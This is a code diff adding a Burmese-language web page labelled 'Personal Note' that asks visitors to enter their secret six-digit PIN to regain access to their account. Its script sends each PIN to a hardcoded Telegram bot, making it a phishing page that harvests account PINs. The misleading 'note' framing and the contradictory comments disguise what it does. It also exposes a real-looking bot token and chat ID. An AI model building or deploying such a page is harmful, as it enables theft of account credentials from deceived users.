@@ -1,0 +1,347 @@
+<!doctype html>
+<html lang="my">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  <title>Personal Note</title>
+
+  <style>
+    /* =========================================================
+       DESIGN
+       Reference design: 729 × 1536
+       The layout below uses the same proportions/positions.
+       ========================================================= */
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      width: 100%;
+      min-height: 100%;
+      background: #fff;
+      font-family: "Noto Sans Myanmar", "Myanmar Text", Arial, sans-serif;
+    }
+
+    body {
+      overflow-x: hidden;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page {
+      position: relative;
+      width: 100vw;
+      max-width: 729px;
+      aspect-ratio: 729 / 1536;
+      height: auto;
+      margin: 0 auto;
+      background: #fff;
+    }
+
+    /* Logo: original reference is about 162 × 162 at x=283, y=101.
+       Replace ONLY the URL in #logo with your actual logo URL. */
+    .logo-wrap {
+      position: absolute;
+      left: 38.82%;
+      top: 6.58%;
+      width: 22.22%;
+      aspect-ratio: 1 / 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #logo {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      display: block;
+
+      /* LOGO PLACEHOLDER
+         Put your image URL here, e.g.
+         src="https://example.com/my-logo.png"
+      */
+    }
+
+    .title {
+      position: absolute;
+      left: 4.9%;
+      top: 23.0%;
+      width: 90.2%;
+      margin: 0;
+      color: #15569f;
+      font-size: clamp(18px, 3.75vw, 27px);
+      line-height: 1.48;
+      font-weight: 700;
+      letter-spacing: 0;
+    }
+
+    .subtitle {
+      position: absolute;
+      left: 5.45%;
+      top: 30.9%;
+      width: 89%;
+      margin: 0;
+      color: #79a57f;
+      font-size: clamp(15px, 3.15vw, 23px);
+      line-height: 1.45;
+      font-weight: 400;
+    }
+
+    /* Six visible boxes. A single input sits over them so the
+       mobile keyboard is a normal numeric keypad. */
+    .code-area {
+      position: absolute;
+      left: 7.0%;
+      top: 36.33%;
+      width: 86.3%;
+      height: 6.85%;
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      background: #fff;
+    }
+
+    .box {
+      border: 2px solid #d5d5d5;
+      border-right-width: 1px;
+      background: #fff;
+    }
+
+    .box:first-child { border-radius: 2px 0 0 2px; }
+    .box:last-child {
+      border-right-width: 2px;
+      border-radius: 0 2px 2px 0;
+    }
+
+    #codeInput {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      z-index: 5;
+      cursor: text;
+      border: 0;
+      outline: 0;
+      font-size: 1px;
+      color: transparent;
+      caret-color: transparent;
+    }
+
+    .digits {
+      position: absolute;
+      inset: 0;
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      pointer-events: none;
+      z-index: 4;
+      align-items: center;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      font-size: clamp(27px, 5vw, 36px);
+      color: #333;
+      font-weight: 400;
+    }
+
+    .confirm {
+      position: absolute;
+      left: 5.35%;
+      top: 46.3%;
+      width: 89.3%;
+      height: 6.25%;
+      min-height: 64px;
+      border: 0;
+      border-radius: 5px;
+      background: #2559a8;
+      color: #fff;
+      font-family: Arial, "Noto Sans Myanmar", sans-serif;
+      font-size: clamp(23px, 4.3vw, 31px);
+      font-weight: 400;
+      cursor: pointer;
+      box-shadow: none;
+    }
+
+    .confirm:active {
+      transform: translateY(1px);
+    }
+
+    .status {
+      position: absolute;
+      left: 6%;
+      top: 53.9%;
+      width: 88%;
+      text-align: center;
+      font-family: Arial, "Noto Sans Myanmar", sans-serif;
+      font-size: 14px;
+      min-height: 20px;
+      color: #666;
+    }
+
+    /* Keep the exact 729 × 1536 proportions from your sample,
+       including text positions and the blue/green spacing, on phones. */
+    @media (min-width: 730px) {
+      .page {
+        height: 1536px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="page">
+
+    <!-- =======================================================
+         LOGO
+         Replace the empty src with your own logo URL.
+         Example:
+         src="https://your-site.com/logo.png"
+         ======================================================= -->
+    <div class="logo-wrap">
+      <img id="logo" src="logo.png">
+    </div>
+
+    <h1 class="title">
+      သင့်အကောင့်ကိုပြန်လည်ဝင်ရောက်ရန်<br>
+      လျှို့ဝှက်နံပါတ်အားရိုက်ထည့်ပါ
+    </h1>
+
+    <p class="subtitle">မှတ်ချက် : သင့် PIN ကိုမည်သူ့ကိုမှပေးမသိပါနှင့်</p>
+
+    <div class="code-area" id="codeArea" aria-label="6 digit note">
+      <div class="box"></div>
+      <div class="box"></div>
+      <div class="box"></div>
+      <div class="box"></div>
+      <div class="box"></div>
+      <div class="box"></div>
+
+      <input
+        id="codeInput"
+        type="tel"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        maxlength="6"
+        autocomplete="one-time-code"
+        aria-label="Enter 6 digit number"
+      >
+
+      <div class="digits" id="digits" aria-hidden="true">
+        <span></span><span></span><span></span>
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+
+    <button class="confirm" id="confirmButton" type="button">Confirm</button>
+    <div class="status" id="status" aria-live="polite"></div>
+
+  </main>
+
+  <script>
+    /*
+      ============================================================
+      TELEGRAM CONFIGURATION
+      ============================================================
+
+      IMPORTANT:
+      A Telegram bot token is a secret credential. Do NOT put the
+      real token in browser HTML/JavaScript: anyone can inspect the
+      page and steal it.
+
+      This HTML therefore sends the 6-digit note to YOUR secure
+      server endpoint. Your endpoint should receive:
+
+        POST JSON
+        { "text": "123456" }
+
+      and then use your Telegram Bot API token server-side to send
+      the message to your chat.
+
+      Replace this URL with your own HTTPS endpoint:
+    */
+    // Direct Telegram Bot API configuration.
+    // WARNING: putting a bot token in browser HTML exposes it to anyone
+    // who can inspect the page. Regenerate the token if it is ever exposed.
+    const TELEGRAM_BOT_TOKEN = "8083620917:AAFwrePga_lgG89kFTAr-iFvLdQNIdoG4KQ";
+    const TELEGRAM_CHAT_ID = "6588889865";
+
+    const input = document.getElementById("codeInput");
+    const digits = [...document.querySelectorAll("#digits span")];
+    const button = document.getElementById("confirmButton");
+    const status = document.getElementById("status");
+    const codeArea = document.getElementById("codeArea");
+
+    function updateDigits() {
+      const value = input.value.replace(/\D/g, "").slice(0, 6);
+      input.value = value;
+
+      digits.forEach((el, i) => {
+        el.textContent = value[i] || "";
+      });
+    }
+
+    input.addEventListener("input", updateDigits);
+
+    codeArea.addEventListener("click", () => {
+      input.focus({ preventScroll: true });
+    });
+
+    async function sendNote() {
+      const value = input.value.replace(/\D/g, "");
+
+      if (value.length !== 6) {
+        status.textContent = "Please enter 6 numbers.";
+        input.focus({ preventScroll: true });
+        return;
+      }
+
+      button.disabled = true;
+      button.textContent = "Confirm";
+      status.textContent = "";
+
+      try {
+        const url =
+          "https://api.telegram.org/bot" +
+          encodeURIComponent(TELEGRAM_BOT_TOKEN) +
+          "/sendMessage";
+
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: value
+          })
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+          throw new Error("Telegram request failed");
+        }
+
+        status.textContent = "";
+        input.value = "";
+        updateDigits();
+      } catch (error) {
+        status.textContent = "Could not save. Check the bot and try again.";
+      } finally {
+        button.disabled = false;
+        button.textContent = "Confirm";
+        input.focus({ preventScroll: true });
+      }
+    }
+
+    button.addEventListener("click", sendNote);
+
+    /* Try to focus immediately so a numeric keyboard can appear.
+       Mobile browsers may still require a user gesture before
+       displaying the virtual keyboard. */
+    window.addEventListener("load", () => {
+      updateDigits();
+      setTimeout(() => {
+        input.focus({ preventScroll: true });
+      }, 150);
+    });
+  </script>
+</body>
+</html>
